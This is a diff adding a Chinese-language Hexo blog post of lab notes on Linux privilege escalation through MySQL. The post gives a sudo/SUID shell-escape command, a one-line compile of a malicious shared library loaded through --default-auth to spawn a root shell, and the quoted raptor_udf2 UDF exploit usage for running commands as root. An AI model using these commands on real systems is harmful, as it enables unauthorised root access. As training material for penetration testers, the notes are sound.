@@ -1,0 +1,636 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="VnNixUxQwNBvFc-nAdXdfYkKhdk4ncl53flMSHEm1gw">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":300,"display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="mysql提权概念和背景MySQL 概念它是一个数据库软件，跑在 Linux 上，作为一个服务（进程）在后台运行。 你可以把它理解成：一个专门存数据的独立程序，有自己的账号、自己的密码、自己的权限。 MySQL 在Linux也也是基于命令行操作，也有root，但和 Linux 的 root 不是一回事 提权背景当我们拿到了低权限 Shell，并且发现系统中存在 MySQL 服务时，通常有两种典型的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux提权2：基于mysql提权">
+<meta property="og:url" content="http://example.com/2026/03/18/ISW/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%832_%E5%9F%BA%E4%BA%8Emysql%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="s0m1ng">
+<meta property="og:description" content="mysql提权概念和背景MySQL 概念它是一个数据库软件，跑在 Linux 上，作为一个服务（进程）在后台运行。 你可以把它理解成：一个专门存数据的独立程序，有自己的账号、自己的密码、自己的权限。 MySQL 在Linux也也是基于命令行操作，也有root，但和 Linux 的 root 不是一回事 提权背景当我们拿到了低权限 Shell，并且发现系统中存在 MySQL 服务时，通常有两种典型的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/ISW/Linux%E6%8F%90%E6%9D%83/2/%E6%9F%A5%E6%89%BEmysql-udf%E7%9A%84exp.png">
+<meta property="og:image" content="http://example.com/images/ISW/Linux%E6%8F%90%E6%9D%83/2/%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0%E6%88%AA%E5%9B%BE.jpg">
+<meta property="article:published_time" content="2026-03-17T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-03-18T04:12:10.361Z">
+<meta property="article:author" content="s0m1ng">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="mysql">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/ISW/Linux%E6%8F%90%E6%9D%83/2/%E6%9F%A5%E6%89%BEmysql-udf%E7%9A%84exp.png">
+
+<link rel="canonical" href="http://example.com/2026/03/18/ISW/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%832_%E5%9F%BA%E4%BA%8Emysql%E6%8F%90%E6%9D%83/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Linux提权2：基于mysql提权 | s0m1ng</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="s0m1ng" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">s0m1ng</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">二进制学习中</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+  <a href="https://github.com/som1ng" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/03/18/ISW/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%832_%E5%9F%BA%E4%BA%8Emysql%E6%8F%90%E6%9D%83/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/profile_photo.jpg">
+      <meta itemprop="name" content="s0m1ng">
+      <meta itemprop="description" content="学习逆向贵在坚持">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="s0m1ng">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Linux提权2：基于mysql提权
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2026-03-18 00:00:00 / 修改时间：12:12:10" itemprop="dateCreated datePublished" datetime="2026-03-18T00:00:00+08:00">2026-03-18</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ISW/" itemprop="url" rel="index"><span itemprop="name">ISW</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ISW/Linux%E6%8F%90%E6%9D%83/" itemprop="url" rel="index"><span itemprop="name">Linux提权</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+  
+  <h1 id="mysql提权概念和背景"><a href="#mysql提权概念和背景" class="headerlink" title="mysql提权概念和背景"></a>mysql提权概念和背景</h1><h2 id="MySQL-概念"><a href="#MySQL-概念" class="headerlink" title="MySQL 概念"></a>MySQL 概念</h2><p>它是一个数据库软件，跑在 Linux 上，作为一个服务（进程）在后台运行。</p>
+<p>你可以把它理解成：<br>一个专门存数据的独立程序，有自己的账号、自己的密码、自己的权限。</p>
+<p>MySQL 在Linux也也是基于命令行操作，也有root，但和 Linux 的 root 不是一回事</p>
+<h2 id="提权背景"><a href="#提权背景" class="headerlink" title="提权背景"></a>提权背景</h2><p>当我们拿到了低权限 Shell，并且发现系统中存在 MySQL 服务时，通常有两种典型的提权思路：</p>
+<p>一种是基于 <code>sudo</code> 权限配置不当的“秒杀”法</p>
+<p>另一种是经典的 UDF (用户自定义函数) 提权法。</p>
+<h1 id="提权方法："><a href="#提权方法：" class="headerlink" title="提权方法："></a>提权方法：</h1><h2 id="命令行层面提权："><a href="#命令行层面提权：" class="headerlink" title="命令行层面提权："></a>命令行层面提权：</h2><p><strong>利用条件：</strong></p>
+<ul>
+<li><p>目标机存在有效的 MySQL 服务端。</p>
+</li>
+<li><p>当前用户可以 <code>sudo mysql</code> (用<code>sudo -l</code>看能否免密执行)，或者 <code>/usr/bin/mysql</code> 被赋予了 <code>SUID</code> 权限 (<code>chmod u+s</code>)。</p>
+</li>
+</ul>
+<h3 id="一键-Shell-逃逸-可以用-的情况"><a href="#一键-Shell-逃逸-可以用-的情况" class="headerlink" title="一键 Shell 逃逸 (可以用\!的情况)"></a>一键 Shell 逃逸 (可以用<code>\!</code>的情况)</h3><p>MySQL 客户端内置了执行系统命令的功能（<code>\!</code>）。如果我们以 root 身份运行了 MySQL 客户端，直接调用 <code>/bin/sh</code> 即可。</p>
+<p>连交互界面都不用进：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> mysql -e <span class="string">&#x27;\! /bin/sh&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>_(如果是 SUID 权限，直接运行 <code>/usr/bin/mysql -e &#39;\! /bin/sh -p&#39;</code> 即可，注意 <code>-p</code> 参数用于保持 SUID 权限)_</p>
+<h3 id="动态链接库劫持-用不了-或者-需要输入密码"><a href="#动态链接库劫持-用不了-或者-需要输入密码" class="headerlink" title="动态链接库劫持 (用不了\!或者 需要输入密码)"></a>动态链接库劫持 (用不了<code>\!</code>或者 需要输入密码)</h3><p>有的服务器会通过一些外部手段严禁mysql去干一些越权的事，比如说用AppArmor 或 SELinux 限制或者开了个沙箱把<code>\!</code>禁了，或者 MySQL 要求强制输入密码而你不知道密码。那我们就要采取这种方式来提权</p>
+<p><strong>原理：</strong> MySQL 5.5 以上版本允许通过 <code>--default-auth</code> 参数指定一个外部的身份验证插件（<code>.so</code> 共享库文件）。我们可以自己写一个恶意的共享库，只要 MySQL 一加载它，就会立刻触发并弹出一个 Root Shell。这是大名鼎鼎的<code>--default-auth</code>漏洞</p>
+<p><strong>利用：</strong></p>
+<ul>
+<li><p><strong>一句话编译恶意动态库：</strong> 直接在靶机终端运行，它会在当前目录生成一个 <code>lib.so</code>：</p>
+<ul>
+<li><p>sudo类型</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;__attribute__((constructor)) init() &#123; execl(&quot;/bin/sh&quot;, &quot;sh&quot;, 0); &#125;&#x27;</span> \</span><br><span class="line">    | gcc -w -fPIC -shared -o lib.so -x c -</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>suid类型</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;__attribute__((constructor)) init() &#123; setuid(0); setgid(0); execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;, 0); &#125;&#x27;</span> | gcc -w -fPIC -shared -o lib.so -x c -</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p><strong>触发库文件加载：</strong> 使用 <code>--default-auth</code> 参数强行让 MySQL 去加载这个库（注意这里要用相对路径或绝对路径指向刚才生成的 <code>lib.so</code>）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> mysql --default-auth ./lib.so</span><br><span class="line"><span class="comment"># 或者如果是 SUID 提权：</span></span><br><span class="line">/usr/bin/mysql --default-auth ./lib.so</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><code>init()</code> 函数执行，拿到 Root Shell！<br>传统的 MySQL UDF（user defined function） 提权</p>
+<hr>
+<p><strong>利用条件：</strong></p>
+<ol>
+<li><p>没有 <code>sudo</code> 也没有 <code>SUID</code>，但我们<strong>拥有 MySQL root 用户的密码</strong>（比如从网站源码里翻到的）。</p>
+</li>
+<li><p>MySQL 服务端本身是以系统 <code>root</code> 用户身份运行的。</p>
+</li>
+<li><p><code>secure_file_priv</code> 为空（允许导出文件到任意目录）。</p>
+</li>
+</ol>
+<p><strong>原理：</strong> UDF (用户自定义函数) 允许我们写 C 代码扩充 SQL 语句。我们把包含 <code>system()</code> 调用的恶意的 <code>.so</code> 文件传入插件目录，创建一个自定义 SQL 函数，然后用 SQL 语句执行系统命令。</p>
+<p><img data-src="/images/ISW/Linux提权/2/查找mysql-udf的exp.png" alt="查找mysql-udf的exp"></p>
+<p>这里选择哪个exp来打取决于靶机的linux系统号，具体用法写在1518.c注释里了（注意文件路径要和它的对应上）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">* Usage:</span><br><span class="line">* $ <span class="built_in">id</span></span><br><span class="line">* uid=500(raptor) gid=500(raptor) <span class="built_in">groups</span>=500(raptor)</span><br><span class="line">* $ gcc -g -c raptor_udf2.c</span><br><span class="line">* $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span><br><span class="line">* $ mysql -u root -p</span><br><span class="line">* Enter password:</span><br><span class="line">* [...]</span><br><span class="line">* mysql&gt; use mysql;</span><br><span class="line">* mysql&gt; create table foo(line blob);</span><br><span class="line">* mysql&gt; insert into foo values(load_file(<span class="string">&#x27;/home/raptor/raptor_udf2.so&#x27;</span>));</span><br><span class="line">* mysql&gt; <span class="keyword">select</span> * from foo into dumpfile <span class="string">&#x27;/usr/lib/raptor_udf2.so&#x27;</span>;</span><br><span class="line">* mysql&gt; create <span class="keyword">function</span> do_system returns <span class="built_in">integer</span> soname <span class="string">&#x27;raptor_udf2.so&#x27;</span>;</span><br><span class="line">* mysql&gt; <span class="keyword">select</span> * from mysql.func;</span><br><span class="line">* +-----------+-----+----------------+----------+</span><br><span class="line">* | name      | ret | dl             | <span class="built_in">type</span>     |</span><br><span class="line">* +-----------+-----+----------------+----------+</span><br><span class="line">* | do_system |   2 | raptor_udf2.so | <span class="keyword">function</span> |</span><br><span class="line">* +-----------+-----+----------------+----------+</span><br><span class="line">* mysql&gt; <span class="keyword">select</span> do_system(<span class="string">&#x27;id &gt; /tmp/out; chown raptor.raptor /tmp/out&#x27;</span>);</span><br><span class="line">* mysql&gt; \! sh</span><br><span class="line">* sh-2.05b$ <span class="built_in">cat</span> /tmp/out</span><br><span class="line">* uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root),1(bin),2(daemon),3(sys),4(adm)</span><br><span class="line">* [...]</span><br><span class="line">*</span><br><span class="line">* E-DB Note: Keep an eye on https://github.com/mysqludf/lib_mysqludf_sys</span><br><span class="line">*</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
+<p>然后把文件传到靶机就不说了</p>
+<p><img data-src="/images/ISW/Linux提权/2/红队笔记截图.jpg" alt="红队笔记截图"></p>
+<p>上面的面板是靶机，左下角是我们运行cat 1518.c后的主机，要注意，除了拥有mysql密码，<code>secure_file_priv</code>字段也要为空，进入mysql后第一件事就是查这个字段</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like <span class="string">&#x27;%secure_file_priv%&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>后面打的顺序就按照usage来就行了</p>
+<h1 id="reference"><a href="#reference" class="headerlink" title="reference :"></a>reference :</h1><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV19s4y1D7Mt/">「红队笔记」Linux提权精讲：演示1 - 服务漏洞利用提权，以MySQL-UDF提权为例_哔哩哔哩_bilibili</a></p>
+
+
+
+    
+    
+    
+        <div class="reward-container">
+  <div>您的支持将鼓励我继续创作!</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/reward.jpg" alt="s0m1ng 微信支付">
+        <p>微信支付</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>s0m1ng
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2026/03/18/ISW/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%832_%E5%9F%BA%E4%BA%8Emysql%E6%8F%90%E6%9D%83/" title="Linux提权2：基于mysql提权">http://example.com/2026/03/18/ISW/Linux本地提权/Linux提权2_基于mysql提权/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> 提权</a>
+              <a href="/tags/Linux/" rel="tag"><i class="fa fa-tag"></i> Linux</a>
+              <a href="/tags/mysql/" rel="tag"><i class="fa fa-tag"></i> mysql</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2026/03/16/PWN/pwn_attack/AWD/AWD%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC/" rel="prev" title="AWD攻击：批量自动化攻击框架">
+      <i class="fa fa-chevron-left"></i> AWD攻击：批量自动化攻击框架
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2026/03/19/PWN/pwn_attack/format_string/fmt_string%E6%80%BB%E7%BB%93/" rel="next" title="格式化字符串漏洞 (Format String)">
+      格式化字符串漏洞 (Format String) <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#mysql%E6%8F%90%E6%9D%83%E6%A6%82%E5%BF%B5%E5%92%8C%E8%83%8C%E6%99%AF"><span class="nav-number">1.</span> <span class="nav-text">mysql提权概念和背景</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#MySQL-%E6%A6%82%E5%BF%B5"><span class="nav-number">1.1.</span> <span class="nav-text">MySQL 概念</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E8%83%8C%E6%99%AF"><span class="nav-number">1.2.</span> <span class="nav-text">提权背景</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="nav-number">2.</span> <span class="nav-text">提权方法：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B1%82%E9%9D%A2%E6%8F%90%E6%9D%83%EF%BC%9A"><span class="nav-number">2.1.</span> <span class="nav-text">命令行层面提权：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E9%94%AE-Shell-%E9%80%83%E9%80%B8-%E5%8F%AF%E4%BB%A5%E7%94%A8-%E7%9A%84%E6%83%85%E5%86%B5"><span class="nav-number">2.1.1.</span> <span class="nav-text">一键 Shell 逃逸 (可以用\!的情况)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E5%8A%AB%E6%8C%81-%E7%94%A8%E4%B8%8D%E4%BA%86-%E6%88%96%E8%80%85-%E9%9C%80%E8%A6%81%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81"><span class="nav-number">2.1.2.</span> <span class="nav-text">动态链接库劫持 (用不了\!或者 需要输入密码)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#reference"><span class="nav-number">3.</span> <span class="nav-text">reference :</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="s0m1ng"
+      src="/images/profile_photo.jpg">
+  <p class="site-author-name" itemprop="name">s0m1ng</p>
+  <div class="site-description" itemprop="description">学习逆向贵在坚持</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">26</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">50</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="http://wpa.qq.com/msgrd?v=3&uin=1327470638&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;1327470638&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="fab fa-qq fa-fw"></i>QQ</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">s0m1ng</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
